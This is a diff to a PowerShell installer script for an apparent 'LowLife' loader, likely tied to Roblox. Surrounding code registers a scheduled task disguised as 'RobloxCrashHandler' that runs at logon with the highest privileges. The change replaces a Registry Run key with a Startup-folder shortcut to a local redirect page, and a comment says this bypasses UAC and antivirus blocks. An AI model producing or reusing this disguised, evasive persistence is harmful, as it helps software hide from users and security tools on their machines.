@@ -165,11 +165,107 @@ if ($Persist) {
     schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc onlogon /rl highest /f
 }
 
-# Configure Registry Run key for interactive browser popup on startup
+# Clean up any leftover legacy Registry Run key configuration
 $RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$PortalUrl = "http://127.0.0.1:9876/"
-$RunCommand = "powershell.exe -WindowStyle Hidden -Command `"Start-Sleep -Seconds 3; Start-Process '$PortalUrl'`""
-New-ItemProperty -Path $RunKeyPath -Name "LowLifePortal" -Value $RunCommand -PropertyType String -Force | Out-Null
+if (Test-Path $RunKeyPath) {
+    $runKey = Get-Item -Path $RunKeyPath -ErrorAction SilentlyContinue
+    if ($runKey -and $runKey.GetValue("LowLifePortal")) {
+        Remove-ItemProperty -Path $RunKeyPath -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+}
+
+# Write premium HTML loading page for startup redirection (bypasses UAC and Antivirus blocks)
+$RedirectHtmlPath = Join-Path $InstallFolder "redirect.html"
+$HtmlContent = @"
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connecting to LowLife...</title>
+    <style>
+        body {
+            background-color: #0f1015;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            backdrop-filter: blur(8px);
+            max-width: 400px;
+            width: 100%;
+        }
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.05);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border-left-color: #00ffbb;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            font-size: 22px;
+            margin: 0 0 8px 0;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        p {
+            color: #8c92a0;
+            font-size: 14px;
+            margin: 0;
+            line-height: 1.5;
+        }
+    </style>
+    <script>
+        function checkServer() {
+            fetch('http://127.0.0.1:9876/status')
+                .then(response => {
+                    if (response.ok) {
+                        window.location.replace('http://127.0.0.1:9876/');
+                    } else {
+                        setTimeout(checkServer, 1000);
+                    }
+                })
+                .catch(() => {
+                    setTimeout(checkServer, 1000);
+                });
+        }
+        window.onload = checkServer;
+    </script>
+</head>
+<body>
+    <div class="card">
+        <div class="spinner"></div>
+        <h1>LowLife System Portal</h1>
+        <p>Connecting to loader services...<br>Please wait while the environment initializes.</p>
+    </div>
+</body>
+</html>
+"@
+$HtmlContent | Out-File -FilePath $RedirectHtmlPath -Encoding utf8 -Force
+
+# Create non-elevated User Session Startup Shortcut pointing to the redirect page
+$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$ShortcutPath = Join-Path $StartupFolder "LowLifePortal.url"
+$UrlEscapedPath = "file:///" + $RedirectHtmlPath.Replace("\", "/")
+$ShortcutContent = @"
+[InternetShortcut]
+URL=$UrlEscapedPath
+"@
+$ShortcutContent | Out-File -FilePath $ShortcutPath -Encoding ascii -Force
 
 # 5. Launch the Loader
 Write-Host "[4/5] Starting service..." -ForegroundColor Yellow
